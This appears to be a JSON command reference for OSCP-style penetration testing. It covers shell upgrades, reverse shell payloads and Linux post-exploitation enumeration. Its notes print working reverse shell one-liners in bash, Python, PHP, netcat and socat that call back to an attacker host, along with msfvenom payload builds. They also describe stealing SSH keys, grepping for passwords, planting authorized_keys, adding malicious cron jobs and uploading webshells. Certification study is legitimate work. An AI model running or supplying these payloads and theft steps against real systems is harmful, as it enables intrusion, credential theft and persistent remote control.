{
  "category": "exploitation",
  "subcategory": "shell-utilities",
  "description": "Essential shell upgrade and Linux enumeration commands for post-exploitation",
  "commands": [
    {
      "id": "pty-spawn-script",
      "name": "Spawn PTY Shell with Script",
      "category": "exploitation",
      "subcategory": "shell-utilities",
      "command": "script /dev/null -c bash",
      "description": "Spawn a proper PTY shell using script command to enable job control, tab completion, and clear screen functionality",
      "tags": [
        "EXPLOITATION",
        "LINUX",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PTY",
        "QUICK_WIN",
        "SHELL_UPGRADE"
      ],
      "variables": [],
      "flag_explanations": {
        "/dev/null": "Discard the typescript log file - we don't need session recording, just the PTY shell functionality",
        "-c bash": "Execute bash in the PTY context - provides full interactive shell with job control (Ctrl+Z, fg, bg)"
      },
      "success_indicators": [
        "Prompt appears with full formatting",
        "Tab completion works",
        "Ctrl+C doesn't kill reverse shell",
        "clear command works",
        "Arrow keys work for command history"
      ],
      "failure_indicators": [
        "script: command not found",
        "Shell still exits on Ctrl+C",
        "Tab completion still broken"
      ],
      "next_steps": [
        "linux-enumerate-users",
        "linux-enumerate-home-directory",
        "check-sudo-privs"
      ],
      "alternatives": [
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "/bin/bash -i"
      ],
      "troubleshooting": {
        "script_not_found": "Use Python alternative: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'. Most Linux systems have Python",
        "still_no_job_control": "After spawning PTY, background shell (Ctrl+Z), run 'stty raw -echo; fg', then press Enter twice. Set TERM: export TERM=xterm",
        "shell_size_wrong": "Get local terminal size: 'stty size' on attacker machine. Set on target: 'stty rows X cols Y'"
      },
      "notes": "CRITICAL OSCP TECHNIQUE: First step after gaining reverse shell.\n\nWHY PTY shell matters:\n(1) Job control - Ctrl+Z to background processes\n(2) Tab completion - essential for enumeration\n(3) Clear screen - Ctrl+L works\n(4) Arrow keys - command history navigation\n(5) Signal handling - Ctrl+C doesn't kill shell\n(6) Interactive programs - su, sudo, ssh work properly\n\nFull shell upgrade sequence:\n1. Spawn PTY: script /dev/null -c bash\n2. Background: Ctrl+Z\n3. Raw mode: stty raw -echo; fg\n4. Press Enter twice\n5. Set terminal: export TERM=xterm\n6. Set size: stty rows X cols Y\n\nAlternatives if script not available:\n- Python3: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n- Python2: python -c 'import pty; pty.spawn(\"/bin/bash\")'\n- Perl: perl -e 'exec \"/bin/bash\";'\n- socat (on target): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT\n\nManual verification:\nBefore upgrade: Ctrl+C kills shell, tab completion broken, clear fails\nAfter upgrade: Full interactive shell with all features\n\nOSCP exam tip: ALWAYS upgrade shell immediately after foothold. Practice the full sequence until muscle memory.\n\nTime estimate: 30 seconds",
      "oscp_relevance": "high"
    },
    {
      "id": "revshells-payload-generate",
      "name": "Generate Reverse Shell Payload",
      "category": "exploitation",
      "subcategory": "shell-utilities",
      "command": "Visit https://www.revshells.com/ or use msfvenom",
      "description": "Generate reverse shell payloads for various languages and platforms using revshells.com online tool",
      "tags": [
        "EXPLOITATION",
        "OSCP:HIGH",
        "PAYLOAD_GENERATION",
        "QUICK_WIN",
        "REVERSE_SHELL",
        "WEB_RESOURCE"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address for reverse shell callback",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker listening port for reverse shell",
          "example": "9001",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Payload copied to clipboard",
        "Listener receives connection",
        "Shell prompt appears"
      ],
      "failure_indicators": [
        "Connection refused",
        "No callback received",
        "Payload blocked by AV/firewall"
      ],
      "next_steps": [
        "nc-listener",
        "pty-spawn-script"
      ],
      "alternatives": [
        "msfvenom",
        "pentestmonkey-cheatsheets"
      ],
      "prerequisites": [
        "nc-listener"
      ],
      "troubleshooting": {
        "no_connection": "Verify LHOST is reachable from target. Check firewall rules. Confirm listener running on LPORT",
        "payload_blocked": "Try different payload type. Base64 encode. Use HTTPS reverse shell. Test egress filtering",
        "connection_dies": "Upgrade to PTY shell immediately. Use stable payload (socat, meterpreter)"
      },
      "notes": "OSCP RESOURCE: https://www.revshells.com/ - Essential bookmark for exam.\n\nPopular payload types:\n(1) Bash TCP: bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n(2) Python3: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n(3) PHP: php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n(4) Netcat: nc -e /bin/sh LHOST LPORT\n(5) Socat: socat TCP:LHOST:LPORT EXEC:/bin/bash\n\nURL encoding for web payloads:\nRevshells.com provides URL-encoded versions automatically.\n\nManual generation with msfvenom:\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f elf > shell.elf\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f exe > shell.exe\nmsfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=9001 -f raw > shell.php\n\nOSCP workflow:\n1. Start listener: nc -lvnp 9001\n2. Generate payload with revshells.com (set LHOST, LPORT)\n3. Execute payload on target (RCE, upload, injection)\n4. Receive shell on listener\n5. Upgrade to PTY immediately\n\nOSCP exam tip: Pre-generate common payloads before exam. Save bash, Python, PHP templates with LHOST/LPORT placeholders.\n\nTime estimate: 1-2 minutes (generation + execution)",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-enumerate-users",
      "name": "Enumerate Linux Users",
      "category": "exploitation",
      "subcategory": "shell-utilities",
      "command": "cat /etc/passwd | grep -E '/bin/(bash|sh)' | cut -d: -f1",
      "description": "Enumerate valid user accounts on Linux system by filtering /etc/passwd for users with login shells",
      "tags": [
        "ENUMERATION",
        "LINUX",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "USER_ENUMERATION"
      ],
      "variables": [],
      "flag_explanations": {
        "grep -E '/bin/(bash|sh)'": "Filter for users with valid login shells - excludes service accounts with /usr/sbin/nologin or /bin/false",
        "cut -d: -f1": "Extract first field (username) from colon-delimited /etc/passwd entries - format is username:x:uid:gid:comment:home:shell"
      },
      "success_indicators": [
        "List of usernames appears",
        "root user visible",
        "Regular user accounts identified",
        "Home directories correspond to /home/<username>"
      ],
      "failure_indicators": [
        "Permission denied",
        "File not found",
        "Empty output"
      ],
      "next_steps": [
        "linux-enumerate-home-directory",
        "check-sudo-privs",
        "su-user-switch"
      ],
      "alternatives": [
        "getent passwd",
        "awk -F: '($7==\"/bin/bash\" || $7==\"/bin/sh\") {print $1}' /etc/passwd"
      ],
      "troubleshooting": {
        "no_results": "Try without grep filter: cat /etc/passwd. All users should be visible even to low-privilege account",
        "permission_denied": "Unusual - /etc/passwd should be world-readable. Try alternatives: getent passwd, ls -la /home",
        "finding_current_user": "Check current context: whoami, id, echo $USER"
      },
      "notes": "CRITICAL OSCP ENUMERATION: Identify lateral movement and privilege escalation targets.\n\n/etc/passwd format:\nusername:password:UID:GID:comment:home_directory:shell\n\nKey observations:\n(1) UID 0 = root (always present)\n(2) UID 1000+ = regular users (target for lateral movement)\n(3) UID < 1000 = system accounts (usually safe to ignore)\n(4) Shell /bin/bash or /bin/sh = interactive login possible\n(5) Shell /usr/sbin/nologin or /bin/false = service account, no login\n\nEnumeration workflow:\n1. List users with login shells (THIS COMMAND)\n2. Check home directories: ls -la /home\n3. Check sudo permissions: sudo -l\n4. Read user-specific config: .bashrc, .bash_history, .ssh/\n\nManual verification:\nFor each user found:\n- Home directory exists? ls -la /home/<username>\n- SSH keys present? ls -la /home/<username>/.ssh/\n- Bash history? cat /home/<username>/.bash_history\n- Sudo access? sudo -l -U <username> (requires higher privs)\n\nOSCP attack paths:\n(1) Password reuse: Try found credentials on other users (su, SSH)\n(2) Weak passwords: Generate wordlist from user info, crack with hydra/john\n(3) SSH key theft: Copy id_rsa from .ssh/ directories\n(4) Sudo exploitation: Check sudo permissions for each user\n\nAlternative methods:\n- getent passwd: Queries NSS databases (includes LDAP/NIS users)\n- awk -F: '$3 >= 1000 {print $1}' /etc/passwd: Filter by UID threshold\n- compgen -u: Bash built-in user listing (if available)\n\nOSCP exam tip: Immediately enumerate users after shell upgrade. Document in enumeration.md. Check each user's home directory for credentials, SSH keys, scripts.\n\nTime estimate: 30 seconds (command) + 5-10 minutes (home directory enumeration)",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-enumerate-home-directory",
      "name": "Enumerate Linux Home Directories",
      "category": "exploitation",
      "subcategory": "shell-utilities",
      "command": "ls -la /home && for dir in /home/*; do echo \"\\n=== $dir ===\"; ls -la \"$dir\" 2>/dev/null; done",
      "description": "Enumerate all user home directories and their contents to discover credentials, SSH keys, scripts, and sensitive files",
      "tags": [
        "ENUMERATION",
        "FILE_DISCOVERY",
        "LINUX",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "variables": [],
      "flag_explanations": {
        "ls -la /home": "List all home directories with permissions and ownership - identifies which users exist and directory permissions",
        "for dir in /home/*": "Iterate through each user's home directory to enumerate contents",
        "2>/dev/null": "Suppress permission denied errors for directories we can't read - keeps output clean"
      },
      "success_indicators": [
        "User directories listed (/home/user1, /home/user2, etc.)",
        "File listings appear for accessible directories",
        ".ssh directories visible",
        ".bash_history files found",
        "Interesting files discovered (credentials, scripts, backups)"
      ],
      "failure_indicators": [
        "Permission denied for all directories",
        "No home directories exist",
        "/home directory doesn't exist"
      ],
      "next_steps": [
        "extract-ssh-key",
        "check-sudo-privs",
        "linux-check-directory-permissions"
      ],
      "alternatives": [
        "find /home -type f -readable 2>/dev/null",
        "grep -r password /home 2>/dev/null"
      ],
      "prerequisites": [
        "linux-enumerate-users",
        "pty-spawn-script"
      ],
      "troubleshooting": {
        "all_permission_denied": "Normal for low-privilege user. Use find to search for world-readable files: find /home -type f -readable 2>/dev/null",
        "no_home_directories": "Check /root separately (requires root). Look for users in /etc/passwd with alternate home directories",
        "too_much_output": "Target specific users: ls -la /home/username. Search for specific files: find /home -name '*password*' -readable 2>/dev/null"
      },
      "notes": "HIGH-VALUE OSCP ENUMERATION: Home directories contain credentials, SSH keys, config files.\n\nHigh-priority targets in home directories:\n(1) .ssh/id_rsa - Private SSH keys for lateral movement\n(2) .ssh/authorized_keys - Shows which keys can access this user\n(3) .bash_history - Command history revealing passwords, IPs, attack vectors\n(4) .bashrc, .profile - Environment variables, aliases (may contain credentials)\n(5) credentials.txt, passwords.txt - Plain text credential files\n(6) .mysql_history - Database query history (may expose passwords)\n(7) .viminfo - Vim editor history (may show edited credential files)\n(8) user.txt - OSCP user flag (proof of user-level access)\n(9) Scripts (*.sh, *.py) - May contain hardcoded credentials\n(10) Config files (.conf, .config/) - Application credentials\n\nEnumeration workflow:\n1. List all home directories (THIS COMMAND)\n2. For each accessible directory:\n   a. Check for .ssh/id_rsa: ls -la /home/user/.ssh/\n   b. Read bash history: cat /home/user/.bash_history\n   c. Search for passwords: grep -i password /home/user/*\n   d. Find world-readable files: find /home/user -type f -readable\n3. Document findings in enumeration.md\n\nManual verification:\nFor each user found:\nls -la /home/<username>/.ssh/\ncat /home/<username>/.bash_history | grep -i 'password\\|ssh\\|sudo'\nfind /home/<username> -type f -readable 2>/dev/null | head -20\n\nCommon OSCP scenarios:\n(1) SSH key theft: Copy id_rsa, chmod 600, ssh -i id_rsa user@target\n(2) Password reuse: Credentials in history/scripts work for sudo/su/SSH\n(3) Writable directories: Upload tools to writable home directories\n(4) Backup files: .backup, .bak, .old files contain old credentials\n\nAdvanced searches:\n# Find all SSH keys\nfind /home -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null\n\n# Search for password strings\ngrep -r -i 'password\\|passwd\\|pwd' /home 2>/dev/null | head -50\n\n# Find recently modified files (recent activity)\nfind /home -type f -mtime -7 -readable 2>/dev/null\n\n# Find SUID binaries in home (unusual)\nfind /home -type f -perm -4000 -readable 2>/dev/null\n\nOSCP exam tip: Enumerate home directories immediately after user enumeration. Focus on .ssh, .bash_history, and grep for 'password'. Document all findings even if not immediately useful.\n\nTime estimate: 2-5 minutes (initial enum) + 10-20 minutes (deep dive)",
      "oscp_relevance": "high"
    },
    {
      "id": "linux-check-directory-permissions",
      "name": "Check Directory Permissions",
      "category": "exploitation",
      "subcategory": "shell-utilities",
      "command": "ls -la <DIRECTORY>",
      "description": "Check directory permissions, ownership, and contents to identify writable locations for privilege escalation or file upload",
      "tags": [
        "ENUMERATION",
        "FILE_PERMISSIONS",
        "LINUX",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION"
      ],
      "variables": [
        {
          "name": "<DIRECTORY>",
          "description": "Directory path to check permissions for",
          "example": "/var/www/html",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Long format - shows permissions, ownership, size, modification time for each file/directory",
        "-a": "Show all files including hidden files (starting with dot) - critical for finding .ssh, .bash_history, .config"
      },
      "success_indicators": [
        "Permission string visible (e.g., drwxrwxrwx)",
        "Owner and group displayed",
        "File listing appears",
        "Hidden files shown (starting with .)"
      ],
      "failure_indicators": [
        "Permission denied",
        "No such file or directory",
        "Cannot access"
      ],
      "next_steps": [
        "chmod-numeric-permissions",
        "mkdir-directory",
        "touch-file"
      ],
      "alternatives": [
        "stat <DIRECTORY>",
        "namei -l <DIRECTORY>"
      ],
      "troubleshooting": {
        "permission_denied": "Try parent directory: ls -la $(dirname <DIRECTORY>). Check current user context: id, groups",
        "understanding_permissions": "Format: drwxrwxrwx = [type][owner][group][other]. r=read(4), w=write(2), x=execute(1)",
        "finding_writable_directories": "Search system-wide: find / -type d -writable 2>/dev/null | grep -v '/proc\\|/sys'"
      },
      "notes": "CRITICAL OSCP SKILL: Identifying writable locations for privilege escalation.\n\nPermission string format:\ndrwxrwxrwx\n│└┬┘└┬┘└┬┘\n│ │  │  └──> Other permissions (everyone else)\n│ │  └─────> Group permissions\n│ └────────> Owner permissions\n└──────────> Type (d=directory, -=file, l=symlink)\n\nPermission bits:\nr (read) = 4    - Can list directory contents (ls)\nw (write) = 2   - Can create/delete files in directory\nx (execute) = 1 - Can cd into directory and access files\n\nOSCP privilege escalation indicators:\n(1) Writable web directory (drwxrwxrwx /var/www/html)\n    → Upload webshell, achieve RCE\n\n(2) Writable /etc (drwxrwxrwx /etc)\n    → Modify /etc/passwd, /etc/shadow, /etc/sudoers\n\n(3) Writable cron directories (drwxrwxrwx /etc/cron.d)\n    → Add malicious cron job for root execution\n\n(4) Writable script run by root (drwxrwxrwx /opt/scripts)\n    → Modify script executed by root cron/systemd\n\n(5) Writable home directory of other user\n    → Plant SSH keys in .ssh/authorized_keys\n\n(6) Writable /tmp, /var/tmp (always writable)\n    → Upload and execute tools (linpeas, exploits)\n\nEnumeration workflow:\n1. Check current directory: ls -la .\n2. Check web root: ls -la /var/www/html\n3. Check /etc: ls -la /etc\n4. Check /opt: ls -la /opt\n5. Check home directories: ls -la /home/*\n6. Find all writable directories:\n   find / -type d -writable 2>/dev/null | grep -v '/proc\\|/sys\\|/run'\n\nManual verification:\nTo test if directory is writable:\ntouch <DIRECTORY>/testfile && rm <DIRECTORY>/testfile && echo \"Writable\" || echo \"Not writable\"\n\nCommon OSCP targets:\n/var/www/html - Web root (upload webshell)\n/etc/cron.d - Cron jobs (add malicious job)\n/opt - Third-party apps (modify scripts)\n/tmp, /var/tmp - Temporary (always writable, upload tools)\n/home/<user> - User home (SSH key injection)\n/usr/local/bin - Local binaries (PATH hijacking)\n\nAdvanced permission checks:\n# Check ACLs (extended permissions)\ngetfacl <DIRECTORY>\n\n# Check SELinux context\nls -Z <DIRECTORY>\n\n# Find SUID binaries in directory\nfind <DIRECTORY> -type f -perm -4000 2>/dev/null\n\n# Recursive permission check\nnamei -l <DIRECTORY>/path/to/file\n\nOSCP exam tip: Document all writable directories in enumeration.md. Check /var/www/html immediately (webshell upload). Test writable directories with touch command before wasting time.\n\nTime estimate: 30 seconds per directory check",
      "oscp_relevance": "high"
    }
  ]
}
